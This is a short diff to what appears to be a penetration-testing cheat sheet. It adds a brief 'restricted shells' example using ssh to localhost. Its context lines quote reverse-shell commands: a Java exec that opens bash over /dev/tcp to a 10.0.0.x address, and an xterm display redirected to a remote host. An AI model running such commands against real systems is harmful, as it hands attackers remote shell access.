@@ -151,6 +151,11 @@ r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.
 xterm -display 10.0.0.1:1
 ```
 
+#### Working with Restricted Shells
+```bash
+# rare cases
+ssh bill@localhost ls -l /tmp
+```
 
 
 #### Uploading/POSTing Files Through WWW Upload Forms
